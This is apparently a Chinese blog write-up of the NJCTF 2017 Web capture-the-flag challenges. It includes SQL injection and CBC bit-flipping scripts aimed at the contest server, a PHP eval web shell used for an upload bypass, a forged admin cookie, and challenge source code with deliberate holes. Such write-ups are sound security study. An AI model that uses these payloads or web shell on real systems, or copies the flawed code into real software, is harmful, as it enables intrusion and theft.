---
title: NJCTF Web部分writeup
date: 2017-03-13 17:21:37
tags:
- Blogs
- ctf
categories:
- Blogs
---


又到了一年一度的比赛季，这次打了打赛宁自己办的NJCTF，这里稍微整理下Web部分的wp，虽然不知道题目是谁出的，但是我觉得大部分题目还是挺蠢的...看的人从中汲取自己想要的知识就好。

![image_1bb32tqf61up77bn1mgpre7c4j9.png-135.1kB][1]

![image_1bb32ubhv13cp1s2u1biup751ra9m.png-753kB][2]

![image_1bb32up8j1di9h6p1eg97fleh13.png-895.8kB][3]

<!--more-->

# Web #

## Login ##

```
login?
```

没啥好玩的，弱口令

username：admin
password：admin123


## Get Flag ##

```
别BB，来拿FLAG

PS:delay 5s
```

命令执行，没什么好说的。

cat 后用 & ls 列目录下文件
flag在../../../9iZM2qTEmq67SOdJp%!oJm2%M4!nhS_thi5_flag


## Text Wall ##

存在.index.php.swo，然后可以找到原题

[https://losfuzzys.github.io/writeup/2016/10/02/tumctf-web50/](https://losfuzzys.github.io/writeup/2016/10/02/tumctf-web50/)

题目源码
```
<?php
//The flag is /var/www/PnK76P1IDfY5KrwsJrh1pL3c6XJ3fj7E_fl4g
$lists = [];
Class filelist{
    public function __toString()
    {
        return highlight_file('hiehiehie.txt', true).highlight_file($this->source, true);
    }
}
if(isset($_COOKIE['lists'])){
    $cookie = $_COOKIE['lists'];
    $hash = substr($cookie, 0, 40);
    $sha1 = substr($cookie, 40);
    if(sha1($sha1) === $hash){
        $lists = unserialize($sha1);
    }
}
if(isset($_POST['hiehiehie'])){
    $info = $_POST['hiehiehie'];
    $lists[] = $info;
    $sha1 = serialize($lists);
    $hash = sha1($sha1);
    setcookie('lists', $hash.$sha1);
    header('Location: '.$_SERVER['REQUEST_URI']);
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
  <title>Please Get Flag!!</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="http://apps.bdimg.com/libs/bootstrap/3.3.0/css/bootstrap.min.css">  
  <script src="http://apps.bdimg.com/libs/jquery/2.1.1/jquery.min.js"></script>
  <script src="http://apps.bdimg.com/libs/bootstrap/3.3.0/js/bootstrap.min.js"></script>
</head>
<body>
<div class="container">
    <div class="jumbotron">
        <h1>Please Get Flag!!</h1>
    </div>
    <div class="row">
        <?php foreach($lists as $info):?>
            <div class="col-sm-4">
              <h3><?=$info?></h3>
            </div>
        <?php endforeach;?>
    </div>
    <form method="post" href=".">
        <input name="hiehiehie" value="hiehiehie">
        <input type="submit" value="submit">
    </form>
</div>
</body>
</html>
```

没啥说的，就把md5改成了sha1

## Be admin ##

存在index.php.bak,cbc反转加密。配合sql注入。

题目不是我做的，所以不多扯了，贴上脚本

```
#! /usr/bin/env python
# -*- coding: utf-8 -*-

import base64
import requests
import urllib

aa = ')\xa5\xa1\xec>)F\x119\xbc\xfcor\x11\xd9\xa4'
url = "http://218.2.197.235:23737/"
cookie = {"PHPSESSID":"qe6s9hjkpqrfcv07hf1ous71m7"}

iv = ["\x00"]*16
cipher = ['\x00', 236, 46, 92, 100, 49, 71, 211, 255, 106, 69, 3, 16, 13, 233, 54]

plain = "admin"
plain += 11*chr(11)
plain = list(plain)

# for i in xrange(16,17):
# 	for j in xrange(1,i):
# 		iv[16-i+j] = chr(cipher[16-i+j] ^ i)
# 	for x in xrange(218,256):
# 		iv[16-i] = chr(x)
# 		tmp_iv = "".join(iv)
# 		cookie['token'] = urllib.quote(base64.b64encode(tmp_iv))
# 		print cookie
# 		try:
# 			r = requests.get(url, cookies=cookie)
# 			print "%s"%x, r.content
# 		except:
# 			print cipher
# 			print x
# 			exit();
# 		if "ctfer!" in r.content:
# 			break
# 	else:
# 		print cipher
# 		exit();
# 	cipher[16-i] = x ^ i
# 	break

# print cipher

# for x in cipher:
# 	print hex(x)

plain = ['a', '\x88', 'C', '5', '\n', ':', 'L', '\xd8', '\xf4', 'a', 'N', '\x08', '\x1b', '\x06', '\xe2', '=']

for x in xrange(193,256):
	plain[0] = chr(x)
	tmp_p = "".join(plain)
	cookie['token'] = urllib.quote(base64.b64encode(tmp_p))
	r = requests.get(url, cookies=cookie)
	print x
	print r.content
```

这里坑特别大，服务器经常跑着跑着就被ban了，然后题目又是必须要跑的


## blog ##

ruby web代码审计

从头看一遍基本上能发现这代码基本没什么功能，控制器里基本上就是关于user的东西，基本就是关于用户信息的增删改查。

所以问题其实基本就是出现在在这里。

![image_1bb35c0pc1tnh19vi150lh7ma51u.png-78.7kB][4]

数据库中关于admin字段的定义是默认为false，在注册函数里，admin是有输入的

![image_1bb35dook13ad2va11hr1g1q1kg52b.png-21.4kB][5]

而默认传入的时候是不输入的，那么问题也就在这里了，如果注册的时候传入user[admin]=1

那么账户就会被定义为admin，逛逛就能找到flag了


## come on ##

这题在比赛时间内没能做出来，但实际上是我弱智了，题目不难，只是太久没见了，压根没想到，宽字节注入。

测试payload
```
http://218.2.197.235:23733/index.php?key=1%df%27||1=1%23

http://218.2.197.235:23733/index.php?key=1%df%27||1=2%23
```

但是有一些东西被过滤了，比如union，大于小于号，还有大把多的盲注函数，最后就剩下left，这里有个函数叫做BINARY，用于比较

payload
```
# coding=utf-8

import requests
import random
import hashlib

s = requests.Session()


def get_flag():

	url='http://218.2.197.235:23733/index.php?key=123%df%27||'
	flag = ""

	payload = "if((select(right(left((select(flag)from(flag)),{}),1)))=binary({}),1,0)%23"

	for j in range(1,33):

		for i in range(20,120):

			r = get_data(url + payload.format(str(j), hex(i)))

			if "002265" in r:
				flag +=chr(i)
				print flag
				break


def get_data(url):
	r = s.get(url)
	return r.text

get_flag()

NJCTF{5H0W_M3_S0M3_sQ1i_TrICk5}
```

## wallet ##

非常扯得是测试了很久，突然给了hint说压缩包密码是弱口令，才反应过来是有源码

http://218.2.197.235:23723/www.zip

跑一万条也没用，因为压缩包的密码是njctf2017，从这里就能发现出题人的无聊了。。。

下面是源码
```
<?php
require_once "db.php";
$auth = 0;
if (isset($_COOKIE["auth"])) {
    $auth = $_COOKIE["auth"];
    $hsh = $_COOKIE["hsh"];
    if ($auth == $hsh) {
        $auth = 0;
    } else {
        if (sha1((string) $hsh) == md5((string) $auth)) {
            $auth = 1;
        } else {
            $auth = 0;
        }
    }
} else {
    $auth = 0;
    $s = $auth;
    setcookie("auth", $s);
    setcookie("hsh", sha1((string) $s));
}
if ($auth) {
    if (isset($_GET['query'])) {
        $db = new SQLite3($SQL_DATABASE, SQLITE3_OPEN_READONLY);
        $qstr = SQLITE3::escapeString($_GET['query']);
        $query = "SELECT amount FROM my_wallets WHERE id={$qstr}";
        $result = $db->querySingle($query);
        if (!$result === NULL) {
            echo "Error - invalid query";
        } else {
            echo "Wallet contains: {$result}";
        }
    } else {
        echo "<html><head><title>Admin Page</title></head><body>Welcome to the admin panel!<br /><br /><form name='input' action='admin.php' method='get'>Wallet ID: <input type='text' name='query'><input type='submit' value='Submit Query'></form></body></html>";
    }
} else {
    echo "Sorry, not authorized.";
}
```

前面是弱类型比较，老梗了，这次是sha1和md5比较，随便跑跑就有了

[https://www.whitehatsec.com/blog/magic-hashes/](https://www.whitehatsec.com/blog/magic-hashes/)

接下来就是sqlite的注入了，一般来说，我们注入sqlite数据库，要从sqlite_master获取建表的语句以及表名，但是这里把sql列删除了，只能获得返回的表名

一共有两个表，flag表和my_wallets表，剩下的问题就是列了...但是想了很多办法都没办法在sqlite中跑，最后随手试了试id....

```
http://218.2.197.235:23723/admin.php?query=-1 union SELECT id FROM flag
```

## Be Logical ##

稍后在整理吧

## pictures wall ##

感觉是个弱智题目，首先是需要登录为root，但是随便登录进去的是个没用的账户，什么都改不了，结果是在登录的时候修改host为127.0.0.1，从代码里看是这样的

```
<?php
    require_once("./waf.php");
    if(isset($_POST["username"]) && isset($_POST["password"])){
        session_start();
        $ip = $_SERVER['HTTP_HOST'];
        if($ip == "::1" || $ip == "127.0.0.1"){
            $_SESSION["token"] = "0";
            header("Location: index.php");
        }else{
            $key = $_POST["username"] . "~:" . $_POST["password"];
            $_SESSION["token"] = base64_encode($key);
            header("Location: index.php");
        }
    }else{
        header("Location: login.html");
        exit();
    }
?>
```

然后是关键部分了，也就是绕过上传文件的waf，这里完全是白名单检测的，只有phtml可以不被改名

![image_1bb3e0eq5ppbvk13rf1nrqhjn2o.png-188.2kB][6]

....迷一样的代码，上传图片，然后修改后缀为phtml，在图片后加入

```
<script language="php"> @eval($_POST[ddog])</script>
```

getshell


## chall 1 2 ##

说实话，原题还是不错的题目，但是不知道为什么强行被撕成了两题，还强行加入了脑洞...

做题能找到原题的wp
[https://www.smrrd.de/nodejs-hacking-challenge-writeup.html](https://www.smrrd.de/nodejs-hacking-challenge-writeup.html)

但题目有改过，测试了下应该是在check密码的时候过了一层md5，在nodejs中，加密函数只接受字符串和buffer，所以原题的解法传入数字就会报错。

这里有个神奇的trick，在nodejs中，如果字符串中全是数字，字符串就会变成数字（真是神tmd...）

```
import hashlib


str = 100000

while 1:
	m2 = hashlib.md5()   
	m2.update(repr(str))
	mm =m2.hexdigest()
	if 'a' not in mm:
		if 'b' not in mm:
			if 'c' not in mm:
				if 'd' not in mm:
					if 'e' not in mm:
						if 'f' not in mm:
							print str
							break
	str+=1

```
很快就跑到一个1518375，开始找缓冲区里的数据...有点儿蛋疼的是，flag比较少，我大概跑了1m左右的文字数据才找到flag

下面就是最大的脑洞问题了，上面找到的flag是这样的
```
NJCTF{P1e45e_s3arch_th1s_s0urce_cod3_0lddriver}
```

但事实上，第二题就是原题中的思路，而flag1就是secretkey，但题目中并没有源码...

也就是如果你想做出第二题，需要上网找到原题的wp，然后下载代码，本地搭建然后修改默认为admin:yes，把cookie代入线上站，getflag2....

```
session=eyJhZG1pbiI6InllcyJ9; session.sig=DLXp3JcD1oX3c8v4pUgOAn-pDYo
```



## Guess ##

挺特别的一题，其实大部分思路都和hctf中的兵者多诡一样，但是这次的难点在于，文件名未知，我们来看看代码

```
upload.php



<?php
error_reporting(0);
function show_error_message($message)
{
    die("<div class=\"msg error\" id=\"message\">
    <i class=\"fa fa-exclamation-triangle\"></i>$message</div>");
}

function show_message($message)
{
    echo("<div class=\"msg success\" id=\"message\">
    <i class=\"fa fa-exclamation-triangle\"></i>$message</div>");
}

function random_str($length = "32")
{
    $set = array("a", "A", "b", "B", "c", "C", "d", "D", "e", "E", "f", "F",
        "g", "G", "h", "H", "i", "I", "j", "J", "k", "K", "l", "L",
        "m", "M", "n", "N", "o", "O", "p", "P", "q", "Q", "r", "R",
        "s", "S", "t", "T", "u", "U", "v", "V", "w", "W", "x", "X",
        "y", "Y", "z", "Z", "1", "2", "3", "4", "5", "6", "7", "8", "9");
    $str = '';

    for ($i = 1; $i <= $length; ++$i) {
        $ch = mt_rand(0, count($set) - 1);
        $str .= $set[$ch];
    }

    return $str;
}

session_start();



$reg='/gif|jpg|jpeg|png/';
if (isset($_POST['submit'])) {

    $seed = rand(0,999999999);
    mt_srand($seed);
    $ss = mt_rand();
    $hash = md5(session_id() . $ss);
    setcookie('SESSI0N', $hash, time() + 3600);

    if ($_FILES["file"]["error"] > 0) {
        show_error_message("Upload ERROR. Return Code: " . $_FILES["file-upload-field"]["error"]);
    }
    $check1 = ((($_FILES["file-upload-field"]["type"] == "image/gif")
            || ($_FILES["file-upload-field"]["type"] == "image/jpeg")
            || ($_FILES["file-upload-field"]["type"] == "image/pjpeg")
            || ($_FILES["file-upload-field"]["type"] == "image/png"))
        && ($_FILES["file-upload-field"]["size"] < 204800));
    $check2=!preg_match($reg,pathinfo($_FILES['file-upload-field']['name'], PATHINFO_EXTENSION));


    if ($check2) show_error_message("Nope!");
    if ($check1) {
        $filename = './uP1O4Ds/' . random_str() . '_' . $_FILES['file-upload-field']['name'];
        if (move_uploaded_file($_FILES['file-upload-field']['tmp_name'], $filename)) {
            show_message("Upload successfully. File type:" . $_FILES["file-upload-field"]["type"]);
        } else show_error_message("Something wrong with the upload...");
    } else {
        show_error_message("only allow gif/jpeg/png files smaller than 200kb!");
    }
}
?>
```

```
index.php

<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Upload</title>
    <link rel="stylesheet" href="http://fortawesome.github.io/Font-Awesome/assets/font-awesome/css/font-awesome.css">
    <link rel="stylesheet" href="CSS/upload.css">

</head>

<body>
<div class="msg info" id="message">
    <i class="fa fa-info-circle"></i>please upload an IMAGE file (gif|jpg|jpeg|png)
</div>
<div class="container">
    <form action="?page=upload" method="post" enctype="multipart/form-data" class="form">
        <div class="file-upload-wrapper" id="file" data-text="Select an image!">
            <label for="file-upload"> <input name="file-upload-field" type="file" class="file-upload-field" value=""
                                             id="file-upload"></label>
        </div>
        <div class="div">
            <input class="button" type="submit" value="Upload Image" name="submit">
        </div>
    </form>

    <script src='http://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>
    <script src="js/filename.js"></script>

</div>


</body>
</html>

<?php
error_reporting(0);

session_start();
if(isset($_GET['page'])){
    $page=$_GET['page'];
}else{
    $page=null;
}

if(preg_match('/\.\./',$page))
{
    echo "<div class=\"msg error\" id=\"message\">
    <i class=\"fa fa-exclamation-triangle\"></i>Attack Detected!</div>";
    die();
}

?>

<?php

if($page)
{
    if(!(include($page.'.php')))
    {
        echo "<div class=\"msg error\" id=\"message\">
    <i class=\"fa fa-exclamation-triangle\"></i>error!</div>";
        exit;
    }
}
?>
```

很容易看到问题了，如果我们想要知道文件名，那就只能爆破随机数种子，看上去很大，事实上是能爆破出来的

![{2C8B3DAC-ABA2-1DE1-B5E4-5084A09E2F83}.png-93.7kB][7]





  [1]: http://static.zybuluo.com/LoRexxar/g723vz1mg3ggwnzyibo9yf74/image_1bb32tqf61up77bn1mgpre7c4j9.png
  [2]: http://static.zybuluo.com/LoRexxar/eufulrcwusgaimxpspk9ukra/image_1bb32ubhv13cp1s2u1biup751ra9m.png
  [3]: http://static.zybuluo.com/LoRexxar/5jeqqi6bvoku72l77d3c0zsv/image_1bb32up8j1di9h6p1eg97fleh13.png
  [4]: http://static.zybuluo.com/LoRexxar/ex5ltlcnb355v32vrqus56g5/image_1bb35c0pc1tnh19vi150lh7ma51u.png
  [5]: http://static.zybuluo.com/LoRexxar/46ouk2f7idkxudoc57cy3kg5/image_1bb35dook13ad2va11hr1g1q1kg52b.png
  [6]: http://static.zybuluo.com/LoRexxar/njo0c3o4x7ye7zb1r9exlt8n/image_1bb3e0eq5ppbvk13rf1nrqhjn2o.png
  [7]: http://static.zybuluo.com/LoRexxar/btey08y9hxtcmryxt0ojtntl/%7B2C8B3DAC-ABA2-1DE1-B5E4-5084A09E2F83%7D.png